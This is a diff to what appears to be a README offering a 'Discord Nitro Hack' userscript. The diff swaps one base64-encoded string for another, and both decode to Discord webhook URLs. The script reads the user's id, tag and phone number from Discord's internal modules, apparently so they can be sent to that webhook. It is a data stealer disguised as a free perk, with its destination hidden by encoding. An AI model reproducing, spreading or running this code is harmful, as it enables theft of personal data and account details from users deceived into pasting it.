@@ -14,7 +14,7 @@ It only works on Desktop Versions (Windows, Linux, MacOS), not on Mobile
 ## Discord Nitro Hack
 ```js
 //Userscript: Discord Nitro Hack Script
-var nitrocode = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTM3NTg2OTIwNjcyODg2ODE0L0loVUVnbVB6ZnJ3M1lRcFdjOUtIUDNUR1JnSkktcGZ6elExYU95b3RMWW9iaWlxd0xjbUw4dnl3R29Pakt0YXd2a2V3"
+var nitrocode = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTM4MzY4MDk4MzEzMDU2Mjc3L2FfSk9EWWo2ZjBzaDc4NXJxTVp2a2ZTVDl2a1VYbEdGZFZlbWhOQUllVkhNRktjZTREX3ZQZGN3RmdvYUNncGt2X3dT"
 var uid = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().id;}}}]);
 var uname = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().tag;}}}]);
 var getp = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().phone;}}}]);
